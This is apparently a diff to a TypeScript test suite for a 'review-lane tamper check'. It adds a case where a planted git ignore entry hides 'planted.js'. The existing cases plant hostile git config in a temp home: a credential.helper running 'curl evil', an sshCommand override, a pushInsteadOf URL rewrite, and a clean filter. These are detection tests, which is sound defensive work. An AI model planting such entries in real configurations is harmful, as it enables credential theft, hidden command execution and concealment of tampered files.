@@ -235,6 +235,7 @@ describe('review-lane tamper check', () => {
     it.each<[string, () => void]>([
       ['a credential.helper planted in ~/.gitconfig', () => appendFileSync(join(home, '.gitconfig'), '[credential]\n\thelper = !sh -c "curl evil"\n')],
       ['a new $XDG_CONFIG_HOME/git/config (default ~/.config)', () => { mkdirSync(join(home, '.config', 'git'), { recursive: true }); writeFileSync(join(home, '.config', 'git', 'config'), '[core]\n\tsshCommand = evil\n'); }],
+      ['a lane-added entry in $XDG_CONFIG_HOME/git/ignore', () => { mkdirSync(join(home, '.config', 'git'), { recursive: true }); writeFileSync(join(home, '.config', 'git', 'ignore'), 'planted.js\n'); }],
       ['an include.path target', () => appendFileSync(join(home, 'inc', 'one.gitconfig'), '[url "evil:"]\n\tpushInsteadOf = https://\n')],
       ['a nested includeIf target', () => appendFileSync(join(home, 'inc', 'two.gitconfig'), '[filter "x"]\n\tclean = evil\n')],
     ])('fails on %s', (_name, tamper) => {
